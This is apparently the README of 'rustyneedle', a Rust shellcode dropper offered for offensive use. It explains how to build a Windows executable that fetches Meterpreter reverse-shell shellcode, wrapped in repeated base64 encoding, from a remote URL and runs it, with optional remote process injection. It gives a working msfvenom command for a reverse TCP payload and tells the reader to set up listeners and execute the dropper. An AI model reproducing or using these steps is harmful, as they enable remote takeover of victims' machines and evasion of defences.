A simple dropper for shellcode that leverages the power of...base64 encoding??

No seriously. And it works. Here's how:

## Usage

1. Create your shellcode however you like, be it with `msfvenom` or other tools. Export the raw shellcode file.

2. Use the encode.py script provided in this repository to create an encoded version of the shellcode. 

```bash
python3 encode.py [SHELLCODE_FILE] [B64_ITERATIONS] [OUT_FILE]
```

### Arguments

* `SHELLCODE_FILE`: raw shellcode file to encode
* `B64_ITERATIONS`: # of times to base64-encode the shellcode
* `OUT_FILE`: Resulting text file of the encoded shellcode. **NOTE:** this will be many times larger than the source!
* `IGNORE_SSL`: Ignores SSL/TLS errors.

### Alternative usage

If you don't want to use the script, you can also encode raw shellcode from `msfvenom`. It would go something like this:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw | base64 -w 0 > note.txt
# Pipe to base64 -w 0 as many times as you want to iterate the encoding
```
3. Edit the source code in `src/main.rs` to reflect the `URL` where the encoded shellcode will be hosted. Make sure `B64_TTERATIONS` matches what you created with `encode.py`. If you wish to use remote injection, change the `PROCESS_NAME` value as well.

4. Run `cargo build --target x86_64-pc-windows-gnu --release`. If building on Linux for Windows, make sure you've added the Windows target triple with `rustup target add x86_64-pc-windows-gnu`.

5. Copy the resulting exe in `target/x86_64-pc-windows-gnu/release/rustyneedle.exe` wherever you like.

6. Set up any listeners, then execute the dropper!
